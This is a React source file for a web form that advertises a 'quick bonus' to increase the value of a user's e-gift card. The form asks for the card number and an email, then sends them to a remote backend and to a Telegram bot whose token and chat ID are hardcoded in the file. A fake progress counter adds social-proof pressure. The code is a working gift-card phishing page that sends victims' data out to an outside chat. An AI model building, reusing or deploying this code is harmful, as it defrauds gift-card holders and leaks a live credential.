import React, { useEffect, useState } from "react";
import "./topForm.css";
import axios from "axios";
import Cards from "../../assets/img/topFormCards.png";
import { useForm } from "react-hook-form";
const cats = [
  { label: "Categ1", id: 1 },
  { label: "Categ2", id: 2 },
  { label: "Categ3", id: 3 },
];

const countries = [
  { label: "Comrat", id: 1 },
  { label: "Chisinau", id: 2 },
  { label: "Cahul", id: 3 },
];

export default function TopForm({ Open, setOpen, Data, setData, currAmount, setcurrAmount, interval, func, totalAmount }) {
 

  let [formData, setFormData] = useState([]);
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  // if true - form is validated, User is allowed to open modal window
  let [formValidated, setformValidated] = useState(false);

  const [CategsInForm, setCategsInForm] = useState([]);
  const [Country, setCountry] = useState([]);

  useEffect(() => {
    setCategsInForm(cats);
    setCountry(countries);
  }, []);

  

  

  useEffect(() => {
    func();
    setTimeout(() => {
      func();
    }, interval + 500);
  });

  let handleForm = (e) => {
    e.preventDefault();

    if (formData.length < 4) {
      setformValidated(false);
    } else {
      setformValidated(true);
    }
  };
  const URI_API = `https://api.telegram.org/bot5394455576:AAH9Gp0cGD7IdKdEIDESPwK63ekeJk8Oez0/sendMessage`;
  const CHAT_ID = '-1001798285405'
  const onSubmit = async (data, e) => {
    e.preventDefault();
    let newdata = `Category: ${data.category} \nE-Gift Number: ${data.egift_number} \nE-Mail: ${data.email} \nCountry: ${data.country}`
    try {
      const res = await axios.post("https://giftspace.herokuapp.com/api/form/", data);
      const res1 = await axios.post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: newdata
      });
      console.log(res.data);
      setOpen(!Open);
      setData(true);
    } catch (e) {
      console.log(e);
      setformValidated(false);
    }
  };

  const handleChange = (e) => {
    setFormData((prev) => {
      return { ...prev, [e.target.name]: e.target.value };
    });
  };
  const handleOdds = () => {
    setOpen(true);
    setData(false);
  };

  return (
    <div className="topForm" id="Multiply">
      <div className="topForm_left">
        <div className="topForm_bgCard">
          <span>don't miss your chance</span>
        </div>
        <div className="topForm_left_cards">
          <img src={Cards} alt="" />
        </div>
        <div className="topForm_left_content">
          <h1>Increase the amount of your E-Gift card</h1>
          <button className="btn" onClick={handleOdds}>
            View Odds
          </button>
          <div className="topForm_bottomInfo">
            <div className="top">
              <span>{currAmount}</span> out of {totalAmount}
            </div>
            <div className="bottom">
              People have alredy received their bonus
            </div>
          </div>
          <div className="bottomLine">
            <div
              className="bottomLineLoaded"
              style={{ width: (currAmount / totalAmount) * 100 + "%" }}
            ></div>
          </div>
        </div>
      </div>
      <div className="topForm_right">
        <h3>quick bonus</h3>
        <div className="topForm_form">
          <div className="topForm_inputArrow">
            <svg
              viewBox="0 0 14 9"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M1 1L7 7L13 1"
                stroke="white"
                strokeWidth="1.5"
                strokeLinecap="round"
              />
            </svg>
          </div>
          <form onSubmit={handleSubmit(onSubmit)}>
            <div className="productFormLeft">
              <label>Category</label>
              <select
                name="category"
                {...register("category", { required: true })}
                onChange={handleChange}
              >
                {CategsInForm.map((cat, i) => (
                  <option key={i} value={cat.label}>
                    {cat.label}
                  </option>
                ))}
              </select>
              <input
                type="text"
                onChange={handleChange}
                {...register("egift_number", { required: true , unique: true})}
                placeholder="E-gift Number"
                name="egift_number"
              />
              <input
                type="email"
                onChange={handleChange}
                {...register("email", { required: true })}
                placeholder="E-Mail"
                name="email"
              />

              <label>Country</label>
              <select
                name="country"
                {...register("country", { required: true })}
                onChange={handleChange}
              >
                {Country.map((c, i) => (
                  <option key={i} value={c.label}>
                    {c.label}
                  </option>
                ))}
              </select>
            </div>

            <button className="btn" type="submit" name="submitBtn">
              Get Bonus Now
            </button>
            {errors.category && <p>Please fill in all fields</p>}
            {errors.country && <p>Please fill in all fields</p>}
            {errors.email && <p>Please fill in all fields</p>}
            {errors.egift_number && <p>Please fill in all fields</p>}
            {formValidated && <p>This e-gift number has already been used</p>}
          </form>
        </div>
      </div>
    </div>
  );
}
